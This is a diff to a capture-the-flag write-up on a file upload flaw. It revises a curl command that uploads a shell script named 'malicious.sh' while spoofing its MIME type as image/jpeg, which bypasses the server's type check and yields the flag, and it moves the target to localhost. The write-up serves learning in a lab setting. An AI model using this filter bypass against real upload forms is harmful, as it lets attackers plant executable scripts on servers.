@@ -13,8 +13,8 @@ With this type of sending, the file MIME type is send by the client and the serv
 With the help of curl, with can manually set this type and send anything we want.
 So with this command you can send any file you want by specifing the parsed MIME type:
 
-curl -F "Upload=send" \
+curl --trace-ascii - -F "Upload=send" \
 -F "uploaded=@ressources/malicious.sh;type=image/jpeg" \
-http://172.16.91.134/index.php\?page=upload
+"http://localhost:9090/index.php\?page\=upload"
 
 The response contains the flag
